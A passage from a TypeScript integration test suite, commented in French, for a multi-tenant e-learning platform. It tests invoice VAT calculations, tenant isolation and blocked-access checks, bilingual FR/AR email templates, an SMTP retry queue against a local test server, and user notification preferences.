    const atlasInvRes = await apiCall(`/invoices/${atlasInvoiceId}`, {}, atlasAdmJar);
    assert(
      atlasInvRes.status === 200 &&
        /^FAC-ATL-\d{4}-\d{5}$/.test(atlasInvRes.body.invoice.invoiceNumber) &&
        atlasInvRes.body.invoice.tvaApplicable === true &&
        atlasInvRes.body.invoice.tvaRatePercent === 19 &&
        atlasInvRes.body.invoice.amountHtDzd === 10000 &&
        atlasInvRes.body.invoice.tvaAmountDzd === 1900 &&
        atlasInvRes.body.invoice.amountTtcDzd === 11900 &&
        atlasInvRes.body.invoice.sellerSnapshot?.nif === '002631099887766' &&
        atlasInvRes.body.invoice.sellerSnapshot?.rc === '31/00-0998877B26',
      'Facture Atlas Oran : séquence indépendante FAC-ATL-..., calcul exact HT (10 000) + TVA 19% (1 900) = TTC (11 900 DZD) et NIF/RC propres'
    );

    // Isolation inter-établissements : l'Admin NajahLearn (Alger) ne peut pas voir ni télécharger la facture d'Atlas Oran (404)
    const crossTenantInvoiceProbe = await apiCall(`/invoices/${atlasInvoiceId}`, {}, adminJar);
    const crossTenantPdfProbe = await apiCall(`/invoices/${atlasInvoiceId}/pdf`, {}, adminJar);
    assert(
      crossTenantInvoiceProbe.status === 404 && crossTenantPdfProbe.status === 404,
      'Isolation Multi-Tenant stricte : une facture d Atlas Oran est invisible (404) depuis NajahLearn Alger'
    );
    console.log(
      `  [PASS] Factures PDF séquentielles (%PDF-1.7) : NIF/NIS/RC/AI, TVA 0% vs 19% (${atlasInvRes.body.invoice.invoiceNumber}), Anti-IDOR (403) & Isolation Multi-Tenant (404)`
    );

    // =========================================================================
    // 6. EMAILS TRANSACTIONNELS SMTP (MODÈLES HTML FR/AR RTL), FILE D'ATTENTE
    //    AVEC REPRISE SUR ÉCHEC, PRÉFÉRENCES & CENTRE DE NOTIFICATIONS IN-APP
    // =========================================================================
    console.log('\n===================================================================');
    console.log('6. EMAILS TRANSACTIONNELS SMTP (FR/AR), FILE D ATTENTE & NOTIFICATIONS');
    console.log('===================================================================');

    // 6.1 Rendu et mise en file d'attente des 5 modèles HTML en français (LTR) et en arabe (RTL + Cairo + chiffres 0-9)
    const allTemplateTypes = [
      'PASSWORD_RESET',
      'PAYMENT_CONFIRMATION',
      'SUBSCRIPTION_EXPIRING_7D',
      'SESSION_REMINDER',
      'ACCOUNT_CREATED',
    ] as const;

    let lastAlgerQueueId = '';
    for (const tplType of allTemplateTypes) {
      for (const locale of ['fr', 'ar'] as const) {
        const tplRes = await apiCall(
          '/emails/test-template',
          {
            method: 'POST',
            body: JSON.stringify({
              templateType: tplType,
              locale,
              recipientEmail: `qa.${tplType.toLowerCase()}.${locale}@najahlearn.dz`,
            }),
          },
          adminJar
        );
        assert(
          tplRes.status === 201 &&
            tplRes.body?.success === true &&
            tplRes.body?.item?.status === 'SENT' &&
            tplRes.body?.item?.locale === locale &&
            typeof tplRes.body?.item?.htmlBody === 'string' &&
            tplRes.body.item.htmlBody.length > 400 &&
            typeof tplRes.body?.item?.textBody === 'string' &&
            tplRes.body.item.textBody.length > 40,
          `Modèle ${tplType} (${locale}) généré et expédié en mode Sandbox (201 SENT)`
        );

        const html: string = tplRes.body.item.htmlBody;
        const text: string = tplRes.body.item.textBody;
        lastAlgerQueueId = tplRes.body.item.id;

        if (locale === 'fr') {
          assert(
            html.includes('lang="fr"') && html.includes('dir="ltr"'),
            `Modèle ${tplType} FR doit avoir lang="fr" et dir="ltr"`
          );
        } else {
          assert(
            html.includes('lang="ar"') &&
              html.includes('dir="rtl"') &&
              html.includes('Cairo') &&
              /[\u0600-\u06FF]/.test(html) &&
              !/[\u0660-\u0669\u06F0-\u06F9]/.test(html) &&
              !/[\u0660-\u0669\u06F0-\u06F9]/.test(text),
            `Modèle ${tplType} AR doit être en RTL (lang="ar" dir="rtl"), police Cairo, texte arabe et chiffres occidentaux 0-9 uniquement`
          );
        }
      }
    }
    console.log(
      '  [PASS] 5 modèles HTML & Texte (PASSWORD_RESET, PAYMENT_CONFIRMATION, SUBSCRIPTION_EXPIRING_7D, SESSION_REMINDER, ACCOUNT_CREATED) validés en FR (LTR) et AR (RTL + Cairo + chiffres 0-9)'
    );

    // 6.2 Transport SMTP réel via serveur TCP local + Reprise sur échec (421 -> RETRY_SCHEDULED backoff -> Retry -> SENT SMTP_LIVE) + Épuisement FAILED
    let smtpAttemptConnections = 0;
    const capturedRawSmtpMessages: string[] = [];

    const localSmtpServer = net.createServer((socket) => {
      smtpAttemptConnections++;
      const connIndex = smtpAttemptConnections;
      socket.setEncoding('utf8');

      // La 1re connexion simule une panne transitoire 421 du relais SMTP pour prouver la mise en RETRY_SCHEDULED
      if (connIndex === 1) {
        socket.write('421 4.3.2 Local SMTP relay temporarily overloaded, try again later\r\n');
        socket.end();
        return;
      }

      socket.write('220 localhost ESMTP NajahLearnTestRelay\r\n');
      let inDataMode = false;
      let lineBuffer = '';
      let dataBuffer = '';
      let awaitingAuthPayload = false;

      socket.on('data', (chunk: string) => {
        if (inDataMode) {
          dataBuffer += chunk;
          const endMarkerIdx = dataBuffer.indexOf('\r\n.\r\n');
          if (endMarkerIdx !== -1) {
            const rawMime = dataBuffer.slice(0, endMarkerIdx);
            capturedRawSmtpMessages.push(rawMime);
            dataBuffer = dataBuffer.slice(endMarkerIdx + 5);
            inDataMode = false;
            socket.write('250 2.0.0 OK: queued as NajahLearnLocalMsg01\r\n');
          }
          return;
        }

        lineBuffer += chunk;
        let rnIdx: number;
        while ((rnIdx = lineBuffer.indexOf('\r\n')) !== -1) {
          const cmdLine = lineBuffer.slice(0, rnIdx);
          lineBuffer = lineBuffer.slice(rnIdx + 2);
          const upper = cmdLine.toUpperCase();

          if (awaitingAuthPayload) {
            awaitingAuthPayload = false;
            socket.write('235 2.7.0 Authentication successful\r\n');
          } else if (upper.startsWith('EHLO') || upper.startsWith('HELO')) {
            socket.write('250-localhost Hello\r\n250-AUTH PLAIN LOGIN\r\n250 8BITMIME\r\n');
          } else if (upper.startsWith('AUTH PLAIN')) {
            if (cmdLine.trim().length > 'AUTH PLAIN'.length) {
              socket.write('235 2.7.0 Authentication successful\r\n');
            } else {
              awaitingAuthPayload = true;
              socket.write('334 \r\n');
            }
          } else if (upper.startsWith('MAIL FROM:')) {
            socket.write('250 2.1.0 Sender OK\r\n');
          } else if (upper.startsWith('RCPT TO:')) {
            socket.write('250 2.1.5 Recipient OK\r\n');
          } else if (upper === 'DATA') {
            inDataMode = true;
            socket.write('354 Start mail input; end with <CRLF>.<CRLF>\r\n');
          } else if (upper.startsWith('QUIT')) {
            socket.write('221 2.0.0 Bye\r\n');
            socket.end();
          } else if (upper.startsWith('RSET') || upper.startsWith('NOOP')) {
            socket.write('250 2.0.0 OK\r\n');
          } else {
            socket.write('250 OK\r\n');
          }
        }
      });
    });

    await new Promise<void>((resolve) => localSmtpServer.listen(0, '127.0.0.1', resolve));
    const localSmtpPort = (localSmtpServer.address() as AddressInfo).port;

    try {
      // Configure EMAIL_SMTP en mode Live pointant sur le serveur TCP local + vérifie le masquage du mot de passe
      const saveSmtpRes = await apiCall(
        '/settings/integrations/EMAIL_SMTP',
        {
          method: 'PUT',
          body: JSON.stringify({
            isEnabled: true,
            isTestMode: false,
            config: {
              host: '127.0.0.1',
              port: localSmtpPort,
              secure: false,
              user: 'mailer@najahlearn.dz',
              pass: 'SmtpSecret#2026!',
              fromName: 'NajahLearn Académie',
              fromEmail: 'noreply@najahlearn.dz',
              replyTo: 'scolarite@najahlearn.dz',
            },
          }),
        },
        adminJar
      );
      assert(
        saveSmtpRes.status === 200 &&
          saveSmtpRes.body?.setting?.isTestMode === false &&
          typeof saveSmtpRes.body?.setting?.config?.pass === 'string' &&
          saveSmtpRes.body.setting.config.pass.includes('••••') &&
          !saveSmtpRes.body.setting.config.pass.includes('SmtpSecret'),
        'Configuration EMAIL_SMTP enregistrée en mode Live et secret SMTP masqué côté client (••••)'
      );

      // Envoi avec mot de passe masqué '••••' pour vérifier la préservation du secret existant en base
      const preserveMaskedPassRes = await apiCall(
        '/settings/integrations/EMAIL_SMTP',
        {
          method: 'PUT',
          body: JSON.stringify({
            isEnabled: true,
            isTestMode: false,
            config: {
              host: '127.0.0.1',
              port: localSmtpPort,
              secure: false,
              user: 'mailer@najahlearn.dz',
              pass: saveSmtpRes.body.setting.config.pass,
              fromName: 'NajahLearn Académie',
              fromEmail: 'noreply@najahlearn.dz',
              replyTo: 'scolarite@najahlearn.dz',
            },
          }),
        },
        adminJar
      );
      assert(preserveMaskedPassRes.status === 200, 'Mise à jour EMAIL_SMTP avec secret masqué préservée');

      // Tentative #1 -> le serveur TCP local renvoie 421 -> statut RETRY_SCHEDULED avec backoff exponentiel (~30s)
      const beforeAttemptMs = Date.now();
      const liveAttempt1 = await apiCall(
        '/emails/test-template',
        {
          method: 'POST',
          body: JSON.stringify({
            templateType: 'PAYMENT_CONFIRMATION',
            locale: 'ar',
            recipientEmail: 'student.live.smtp@najahlearn.dz',
          }),
        },
        adminJar
      );
      assert(
        liveAttempt1.status === 201 &&
          liveAttempt1.body?.item?.status === 'RETRY_SCHEDULED' &&
          liveAttempt1.body?.item?.attempts === 1 &&
          typeof liveAttempt1.body?.item?.lastError === 'string' &&
          liveAttempt1.body.item.lastError.length > 0 &&
          new Date(liveAttempt1.body.item.nextAttemptAt).getTime() >= beforeAttemptMs + 25_000,
        'Panne SMTP 421 sur tentative #1 : passage en RETRY_SCHEDULED avec backoff exponentiel >= 25s'
      );

      const liveEmailId = liveAttempt1.body.item.id as string;

      // Tentative #2 via relance manuelle (POST /api/emails/queue/:id/retry) -> le serveur TCP accepte et reçoit le MIME complet
      const retryLiveRes = await apiCall(
        `/emails/queue/${liveEmailId}/retry`,
        { method: 'POST' },
        adminJar
      );
      assert(
        retryLiveRes.status === 200 &&
          retryLiveRes.body?.item?.status === 'SENT' &&
          retryLiveRes.body?.item?.attempts === 2 &&
          retryLiveRes.body?.item?.deliveryMode === 'SMTP_LIVE' &&
          capturedRawSmtpMessages.length === 1 &&
          capturedRawSmtpMessages[0].includes('student.live.smtp@najahlearn.dz'),
        'Reprise après échec SMTP réussie : e-mail livré via socket TCP réel (SMTP_LIVE) à la 2e tentative'
      );

      // Relance d'un e-mail déjà SENT -> HTTP 409 EMAIL_ALREADY_SENT
      const retryAlreadySentRes = await apiCall(
        `/emails/queue/${liveEmailId}/retry`,
        { method: 'POST' },
        adminJar
      );
      assert(
        retryAlreadySentRes.status === 409 &&
          retryAlreadySentRes.body?.error === 'EMAIL_ALREADY_SENT',
        'Relance bloquée (409 EMAIL_ALREADY_SENT) sur un e-mail déjà expédié'
      );
    } finally {
      // Restauration immédiate du mode Sandbox par défaut pour NajahLearn Alger
      await apiCall(
        '/settings/integrations/EMAIL_SMTP',
        {
          method: 'PUT',
          body: JSON.stringify({
            isEnabled: true,
            isTestMode: true,
            config: {
              host: 'smtp.najahlearn.dz',
              port: 587,
              secure: false,
              user: 'noreply@najahlearn.dz',
              pass: '',
              fromName: 'NajahLearn Académie',
              fromEmail: 'scolarite@najahlearn.dz',
              replyTo: 'scolarite@najahlearn.dz',
            },
          }),
        },
        adminJar
      ).catch(() => {});
      await new Promise<void>((resolve) => localSmtpServer.close(() => resolve()));
    }

    // Test d'épuisement maxAttempts -> FAILED permanent + journal d'audit + reprise manuelle réussie
    const exhaustedDispatch = await dispatchTransactionalNotification({
      tenantId: DEFAULT_TENANT_ID,
      recipientEmail: 'exhausted.queue@najahlearn.dz',
      recipientName: 'Étudiant Test File',
      preferredLocale: 'fr',
      templateType: 'PASSWORD_RESET',
      maxAttempts: 2,
      simulateTransientFailuresCount: 2,
      skipInAppNotification: true,
      skipImmediateProcess: true,
      variables: { resetToken: 'rst_exhaust_test_123456', expiresMinutes: 60 },
    });
    assert(
      exhaustedDispatch.emailQueued && Boolean(exhaustedDispatch.emailQueueItem?.id),
      'Message de test maxAttempts=2 inséré en file d attente'
    );
    const exhaustedEmailId = exhaustedDispatch.emailQueueItem!.id;

    // 1er passage -> RETRY_SCHEDULED (1/2)
    const batch1 = await processEmailQueueBatch({
      tenantId: DEFAULT_TENANT_ID,
      onlyEmailId: exhaustedEmailId,
      forceDueNow: true,
      limit: 1,
    });
    assert(batch1.retryScheduledCount === 1, 'Passage 1/2 en RETRY_SCHEDULED');

    // 2e passage -> FAILED définitif (2/2)
    const batch2 = await processEmailQueueBatch({
      tenantId: DEFAULT_TENANT_ID,
      onlyEmailId: exhaustedEmailId,
      forceDueNow: true,
      limit: 1,
    });
    assert(batch2.failedPermanentlyCount === 1, 'Passage 2/2 en FAILED définitif après épuisement maxAttempts');

    const failedDetailRes = await apiCall(`/emails/queue/${exhaustedEmailId}`, {}, adminJar);
    assert(
      failedDetailRes.status === 200 &&
        failedDetailRes.body?.item?.status === 'FAILED' &&
        failedDetailRes.body?.item?.attempts === 2,
      'Statut FAILED vérifié via GET /api/emails/queue/:id'
    );

    // Relance manuelle depuis l'état FAILED -> augmente maxAttempts et expédie à la 3e tentative -> SENT
    const recoverFromFailedRes = await apiCall(
      `/emails/queue/${exhaustedEmailId}/retry`,
      { method: 'POST' },
      adminJar
    );
    assert(
      recoverFromFailedRes.status === 200 &&
        recoverFromFailedRes.body?.item?.status === 'SENT' &&
        recoverFromFailedRes.body?.item?.attempts === 3,
      'Relance manuelle d un e-mail FAILED : quota étendu et livraison réussie (SENT à la 3e tentative)'
    );
    console.log(
      '  [PASS] File d attente SMTP & Reprise sur échec : serveur TCP réel (421 -> RETRY_SCHEDULED -> SMTP_LIVE), épuisement FAILED (2/2) & récupération manuelle'
    );

    // 6.3 Déclencheurs métier automatiques : Création compte, Mot de passe oublié, Abonnement J-7 & Rappel de séance (avec déduplication)
    const createdMailStuEmail = `amina.smtp.${Date.now()}@najahlearn.dz`;
    const createStuWithMailRes = await apiCall(
      '/students',
      {
        method: 'POST',
        body: JSON.stringify({
          name: 'Amina Benkhedda',
          email: createdMailStuEmail,
          wilaya: '16 - Alger',
          academicLevel: 'Master 2 Informatique',
          classId: 'cls_web_1',
        }),
      },
      adminJar
    );
    assert(createStuWithMailRes.status === 201, 'Création étudiant Amina réussie (201)');
    const aminaStuId = createStuWithMailRes.body.student.id as string;
    cleanupUserIds.push(aminaStuId);

    // Vérifie que l'inscription dans cls_fs_g1 sera nettoyée
    const aminaEnrollments = await db
      .select()
      .from(enrollments)
      .where(eq(enrollments.studentId, aminaStuId));
    for (const enr of aminaEnrollments) {
      cleanupEnrollmentIds.push(enr.id);
    }

    // Vérifie l'e-mail ACCOUNT_CREATED avec matricule & mot de passe temporaire généré
    const queueAfterStuRes = await apiCall(
      '/emails/queue?templateType=ACCOUNT_CREATED&limit=20',
      {},
      adminJar
    );
    const aminaWelcomeEmail = (queueAfterStuRes.body?.items || []).find(
      (it: any) => it.recipientEmail === createdMailStuEmail
    );
    assert(
      Boolean(aminaWelcomeEmail) && aminaWelcomeEmail.status === 'SENT',
      'Création étudiant déclenche automatiquement un e-mail transactionnel ACCOUNT_CREATED (SENT)'
    );

    // Bascule la langue préférée d'Amina en arabe ('ar') pour vérifier que les rappels automatiques utilisent la langue de l'utilisateur
    await db
      .update(users)
      .set({ preferredLanguage: 'ar' })
      .where(eq(users.id, aminaStuId));

    // Mot de passe oublié -> génère un e-mail PASSWORD_RESET en arabe (langue préférée d'Amina)
    const forgotPwdMailRes = await apiCall('/auth/forgot-password', {
      method: 'POST',
      headers: { 'X-Forwarded-For': '10.88.77.66' },
      body: JSON.stringify({ email: createdMailStuEmail }),
    });
    assert(
      forgotPwdMailRes.status === 200 && Boolean(forgotPwdMailRes.body?.testToken),
      'POST /api/auth/forgot-password génère le jeton et planifie l e-mail PASSWORD_RESET'
    );

    const queuePwdRes = await apiCall(
      '/emails/queue?templateType=PASSWORD_RESET&limit=20',
      {},
      adminJar
    );
    const aminaResetMail = (queuePwdRes.body?.items || []).find(
      (it: any) => it.recipientEmail === createdMailStuEmail
    );
    assert(
      Boolean(aminaResetMail) &&
        aminaResetMail.locale === 'ar' &&
        aminaResetMail.status === 'SENT',
      'Mot de passe oublié envoie automatiquement le modèle PASSWORD_RESET en arabe (RTL) selon preferredLanguage'
    );

    // Crée un abonnement ACTIVE expirant exactement dans 7 jours (par rapport à 2026-06-01 -> endDate 2026-06-08)
    const exp7SubId = `sub_exp7_${Date.now()}`;
    cleanupSubscriptionIds.push(exp7SubId);
    await db.insert(subscriptions).values({
      id: exp7SubId,
      tenantId: DEFAULT_TENANT_ID,
      studentId: aminaStuId,
      courseId: 'crs_web',
      planId: 'plan_monthly',
      startDate: '2026-05-08',
      endDate: '2026-06-08',
      status: 'ACTIVE',
      notes: 'Test expiration J-7',
      createdAt: new Date().toISOString(),
    });

    // Crée une séance SCHEDULED dans les prochaines 6 heures par rapport à 2026-06-01T10:00:00Z -> 2026-06-01T16:00:00Z
    const upcomingSessId = `ses_rem_${Date.now()}`;
    cleanupSessionIds.push(upcomingSessId);
    await db.insert(sessions).values({
      id: upcomingSessId,
      tenantId: DEFAULT_TENANT_ID,
      classId: 'cls_web_1',
      courseId: 'crs_web',
      teacherId: 'usr_tch_1',
      title: 'Séance Live Architecture Microservices',
      scheduledAt: '2026-06-01T16:00:00.000Z',
      durationMinutes: 90,
      videoProvider: 'ZOOM',
      videoMeetingId: '9988776655',
      videoJoinUrl: 'https://zoom.us/j/9988776655',
      status: 'SCHEDULED',
      createdAt: new Date().toISOString(),
    });

    // 1re exécution du sweep combiné (Abonnements J-7 + Séances < 24h)
    const sweepRun1 = await apiCall(
      '/emails/run-sweeps',
      {
        method: 'POST',
        body: JSON.stringify({
          referenceDateYmd: '2026-06-01',
          referenceTimeIso: '2026-06-01T10:00:00.000Z',
          windowHours: 24,
        }),
      },
      adminJar
    );
    assert(
      sweepRun1.status === 200 &&
        sweepRun1.body?.subscriptionsSweep?.emailsQueued >= 1 &&
        sweepRun1.body?.sessionsSweep?.emailsQueued >= 1,
      'Sweep automatique J-7 & Rappel de séance : e-mails SUBSCRIPTION_EXPIRING_7D et SESSION_REMINDER mis en file'
    );

    // 2e exécution identique -> 0 doublon grâce à dedupKey
    const sweepRun2 = await apiCall(
      '/emails/run-sweeps',
      {
        method: 'POST',
        body: JSON.stringify({
          referenceDateYmd: '2026-06-01',
          referenceTimeIso: '2026-06-01T10:00:00.000Z',
          windowHours: 24,
        }),
      },
      adminJar
    );
    assert(
      sweepRun2.status === 200 &&
        sweepRun2.body?.subscriptionsSweep?.emailsQueued === 0 &&
        sweepRun2.body?.sessionsSweep?.emailsQueued === 0,
      'Idempotence des sweeps automatiques : aucun doublon d e-mail envoyé lors d un second passage (dedupKey)'
    );
    console.log(
      '  [PASS] Événements métier automatiques (ACCOUNT_CREATED, PASSWORD_RESET AR, SUBSCRIPTION_EXPIRING_7D J-7, SESSION_REMINDER <24h) + anti-doublon dedupKey'
    );

    // 6.4 Préférences de notification par utilisateur (Email & In-App) + Validation stricte Zod
    const getPrefsRes = await apiCall('/notifications/preferences', {}, billStuJar);
    assert(
      getPrefsRes.status === 200 &&
        getPrefsRes.body?.preferences?.emailPasswordReset === true &&
        getPrefsRes.body?.preferences?.emailSessionReminder === true &&
        getPrefsRes.body?.preferences?.inAppSessionReminder === true,
      'GET /api/notifications/preferences retourne les préférences actives par défaut'
    );

    // Tentative de désactiver emailPasswordReset (champ non modifiable / absent du schéma strict) -> HTTP 400 VALIDATION_ERROR
    const invalidPrefAttempt = await apiCall(
      '/notifications/preferences',
      {
        method: 'PUT',
        body: JSON.stringify({
          emailPasswordReset: false,
        }),
      },
      billStuJar
    );
    assert(
      invalidPrefAttempt.status === 400 &&
        invalidPrefAttempt.body?.error === 'VALIDATION_ERROR',
      'Impossible de désactiver les alertes critiques de sécurité PASSWORD_RESET (400 Zod .strict())'
    );

    // L'étudiant désactive les rappels de séance par Email ET In-App
    const disableSessionRemRes = await apiCall(
      '/notifications/preferences',
      {
        method: 'PUT',
        body: JSON.stringify({
          emailSessionReminder: false,
          inAppSessionReminder: false,
        }),
      },
      billStuJar
    );
    assert(
      disableSessionRemRes.status === 200 &&
        disableSessionRemRes.body?.preferences?.emailSessionReminder === false &&
        disableSessionRemRes.body?.preferences?.inAppSessionReminder === false &&
        disableSessionRemRes.body?.preferences?.emailPasswordReset === true,
      'PUT /api/notifications/preferences persiste la désactivation Email + In-App pour SESSION_REMINDER'
    );

    // Un dispatch SESSION_REMINDER vers cet étudiant respecte ses préférences (0 emailQueued, 0 inAppCreated)
    const skippedSessionDispatch = await dispatchTransactionalNotification({
      tenantId: DEFAULT_TENANT_ID,
      userId: billingStuId,
      recipientEmail: 'yacine.bill@najahlearn.dz',
      recipientName: 'Yacine Facturation',
      templateType: 'SESSION_REMINDER',
      variables: {
        sessionTitle: 'Séance Ignorée Par Préférence',
        courseTitle: 'Cybersécurité',
        scheduledDisplay: '2026-06-05 18:00',
      },
    });
    assert(
      skippedSessionDispatch.emailQueued === false &&
        skippedSessionDispatch.emailSkippedByPreference === true &&
        skippedSessionDispatch.inAppCreated === false &&
        skippedSessionDispatch.inAppSkippedByPreference === true,
      'Les préférences utilisateur bloquent effectivement l envoi Email et In-App pour la catégorie désactivée'
    );

    // En revanche, PASSWORD_RESET reste toujours distribué par e-mail même si d'autres catégories sont désactivées
    const criticalResetDispatch = await dispatchTransactionalNotification({
      tenantId: DEFAULT_TENANT_ID,
      userId: billingStuId,
      recipientEmail: 'yacine.bill@najahlearn.dz',
      recipientName: 'Yacine Facturation',
      templateType: 'PASSWORD_RESET',
      skipInAppNotification: true,
      variables: { resetToken: 'rst_critical_always_on', expiresMinutes: 60 },
    });
    assert(
      criticalResetDispatch.emailQueued === true &&
        criticalResetDispatch.emailSkippedByPreference === false,
      'L alerte critique PASSWORD_RESET est toujours expédiée indépendamment des autres préférences'
    );
    console.log(
      '  [PASS] Préférences de notification par utilisateur : filtrage effectif par canal (Email / In-App), protection Zod .strict() & immutabilité PASSWORD_RESET'
    );

    // 6.5 Centre de notifications In-App (filtres, lecture unitaire/globale, suppression), Anti-IDOR (403) & Isolation Multi-Tenant (404)
    // Génère 2 notifications In-App pour billingStuId (PAYMENT_CONFIRMATION déjà activé)
    const inAppDisp1 = await dispatchTransactionalNotification({
      tenantId: DEFAULT_TENANT_ID,
      userId: billingStuId,
      recipientEmail: 'yacine.bill@najahlearn.dz',
      recipientName: 'Yacine Facturation',
      templateType: 'ACCOUNT_CREATED',
      variables: { studentIdNumber: 'ETU-2026-888', courseTitle: 'Cybersécurité' },
    });
    const inAppDisp2 = await dispatchTransactionalNotification({
      tenantId: DEFAULT_TENANT_ID,
      userId: billingStuId,
      recipientEmail: 'yacine.bill@najahlearn.dz',
      recipientName: 'Yacine Facturation',
      templateType: 'SUBSCRIPTION_EXPIRING_7D',
      variables: { courseTitle: 'Cybersécurité', endDate: '2026-06-10', daysRemaining: 7 },
    });
    assert(
      inAppDisp1.inAppCreated &&
        Boolean(inAppDisp1.inAppNotificationId) &&
        inAppDisp2.inAppCreated &&
        Boolean(inAppDisp2.inAppNotificationId),
      'Notifications In-App catégorisées créées dans le centre de notifications'
    );
    const stuNotifId1 = inAppDisp1.inAppNotificationId!;
    const stuNotifId2 = inAppDisp2.inAppNotificationId!;
    cleanupNotificationIds.push(stuNotifId1, stuNotifId2);

    // Filtre par catégorie ACCOUNT_CREATED & compteur non-lus
    const listNotifsFiltered = await apiCall(
      '/notifications?category=ACCOUNT_CREATED&unreadOnly=true',
      {},
      billStuJar
    );
    assert(
      listNotifsFiltered.status === 200 &&
        typeof listNotifsFiltered.body?.unreadCount === 'number' &&
        listNotifsFiltered.body.unreadCount >= 2 &&
        (listNotifsFiltered.body.notifications || []).some((n: any) => n.id === stuNotifId1) &&
        (listNotifsFiltered.body.notifications || []).every(
          (n: any) => n.category === 'ACCOUNT_CREATED' && n.read === false
        ),
      'GET /api/notifications supporte les filtres category + unreadOnly et renvoie unreadCount exact'
    );

    // Anti-IDOR : l'Admin Alger tente de marquer ou supprimer la notification privée de l'étudiant -> 403 RESOURCE_OWNERSHIP_FORBIDDEN
    const idorReadNotif = await apiCall(
      `/notifications/${stuNotifId1}/read`,
      { method: 'PATCH' },
      adminJar
    );
    const idorDeleteNotif = await apiCall(
      `/notifications/${stuNotifId1}`,
      { method: 'DELETE' },
      adminJar
    );
    assert(
      idorReadNotif.status === 403 &&
        idorReadNotif.body?.error === 'RESOURCE_OWNERSHIP_FORBIDDEN' &&
        idorDeleteNotif.status === 403 &&
        idorDeleteNotif.body?.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'Anti-IDOR Centre de notifications : modification/suppression de la notification d autrui bloquée en 403'
    );

    // Lecture unitaire -> read: true + readAt renseigné
    const markOneReadRes = await apiCall(
      `/notifications/${stuNotifId1}/read`,
      { method: 'PATCH' },
      billStuJar
    );
    assert(markOneReadRes.status === 200, 'PATCH /api/notifications/:id/read réussi (200)');

    // Tout marquer comme lu -> unreadCount tombe à 0
    const markAllReadRes = await apiCall(
      '/notifications/read-all',
      { method: 'POST' },
      billStuJar
    );
    assert(
      markAllReadRes.status === 200 && markAllReadRes.body?.updatedCount >= 1,
      'POST /api/notifications/read-all marque toutes les notifications restantes comme lues'
    );

    const afterReadAllRes = await apiCall('/notifications', {}, billStuJar);
    assert(
      afterReadAllRes.status === 200 && afterReadAllRes.body?.unreadCount === 0,
      'Après read-all, unreadCount vaut 0'
    );

    // Suppression d'une notification par son propriétaire
    const deleteOwnNotifRes = await apiCall(
      `/notifications/${stuNotifId2}`,
      { method: 'DELETE' },
      billStuJar
    );
    assert(deleteOwnNotifRes.status === 200, 'DELETE /api/notifications/:id par le propriétaire réussi (200)');

    // Isolation Multi-Tenant de la file SMTP : l'Admin d'Atlas Oran ne peut ni consulter ni relancer un e-mail de NajahLearn Alger (404)
    const crossTenantQueueGet = await apiCall(
      `/emails/queue/${lastAlgerQueueId}`,
      {},
      atlasAdmJar
    );
    const crossTenantQueueRetry = await apiCall(
      `/emails/queue/${lastAlgerQueueId}/retry`,
      { method: 'POST' },
      atlasAdmJar
    );
    assert(
      crossTenantQueueGet.status === 404 && crossTenantQueueRetry.status === 404,
      'Isolation Multi-Tenant stricte sur email_queue : un e-mail d Alger est invisible (404) depuis Atlas Oran'
    );
    console.log(
      '  [PASS] Centre de notifications In-App (filtres, read, read-all, delete), Anti-IDOR (403) & Isolation Multi-Tenant email_queue (404)'
    );

    console.log(
      '\n✅ TOUS LES TESTS DE SÉCURITÉ, MULTI-TENANT, I18N (FR/AR + RTL), CHARGILY PAY V2, FACTURES PDF, EMAILS SMTP & NOTIFICATIONS SONT PASSÉS AVEC SUCCÈS !'
    );
  } finally {
    // Restauration garantie du mode Sandbox SMTP par défaut sur NajahLearn Alger
    await db
      .update(integrationSettings)
      .set({
        isEnabled: true,
        isTestMode: true,
        config: {
          host: 'smtp.najahlearn.dz',
          port: 587,
          secure: false,
          user: 'noreply@najahlearn.dz',
          pass: '',
          fromName: 'NajahLearn Académie',
          fromEmail: 'scolarite@najahlearn.dz',
          replyTo: 'scolarite@najahlearn.dz',
        },
        updatedAt: new Date().toISOString(),
      })
      .where(
        and(
          eq(integrationSettings.tenantId, DEFAULT_TENANT_ID),
          eq(integrationSettings.provider, 'EMAIL_SMTP')
        )
      )
      .catch(() => {});

    // Nettoyage des e-mails de test et préférences créés durant l'exécution de la suite
    await db
      .delete(emailQueue)
      .where(gte(emailQueue.createdAt, testStartIso))
      .catch(() => {});
    await db
      .delete(userNotificationPreferences)
      .where(gte(userNotificationPreferences.updatedAt, testStartIso))
      .catch(() => {});

    for (const enrId of cleanupEnrollmentIds) {
      await db.delete(enrollments).where(eq(enrollments.id, enrId)).catch(() => {});
    }
    if (cleanupEnrollmentIds.length > 0) {
      await db
        .update(classes)
        .set({ enrolledCount: 6 })
        .where(eq(classes.id, 'cls_web_1'))
        .catch(() => {});
    }
    for (const sesId of cleanupSessionIds) {
      await db.delete(sessions).where(eq(sessions.id, sesId)).catch(() => {});
    }

    await db
      .update(users)
      .set({ preferredLanguage: 'fr' })
      .where(eq(users.id, 'usr_stu_1'))
      .catch(() => {});
    await db
      .update(users)
      .set({ preferredLanguage: 'fr' })
      .where(eq(users.id, 'usr_super_1'))
      .catch(() => {});
    for (const diskPath of cleanupUploadDiskPaths) {
      if (fs.existsSync(diskPath)) {
        await fs.promises.unlink(diskPath).catch(() => {});
      }
    }
    for (const upId of cleanupUploadIds) {
      await db.delete(auditLogs).where(eq(auditLogs.entityId, upId)).catch(() => {});
      await db.delete(uploadedFiles).where(eq(uploadedFiles.id, upId)).catch(() => {});
    }
    for (const nId of cleanupNotificationIds) {
      await db.delete(notifications).where(eq(notifications.id, nId)).catch(() => {});
    }

    // Nettoyage FK-safe des entités de facturation (relances, factures, checkouts, webhooks, échéanciers) avant paiements/utilisateurs
    const allPaymentIdsToClean = [
      ...cleanupPaymentIds,
      ...(createdPaymentId ? [createdPaymentId] : []),
    ];
    for (const evtId of cleanupWebhookEventIds) {
      await db
        .delete(paymentWebhookEvents)
        .where(eq(paymentWebhookEvents.eventId, evtId))
        .catch(() => {});
    }
    await db
      .delete(paymentWebhookEvents)
      .where(gte(paymentWebhookEvents.processedAt, testStartIso))
      .catch(() => {});

    for (const chkId of cleanupCheckoutIds) {
      await db.delete(chargilyCheckouts).where(eq(chargilyCheckouts.id, chkId)).catch(() => {});
    }
    for (const pId of allPaymentIdsToClean) {
      await db.delete(invoices).where(eq(invoices.paymentId, pId)).catch(() => {});
      await db.delete(chargilyCheckouts).where(eq(chargilyCheckouts.paymentId, pId)).catch(() => {});
    }
    for (const planId of cleanupInstallmentPlanIds) {
      await db.delete(paymentReminders).where(eq(paymentReminders.planId, planId)).catch(() => {});
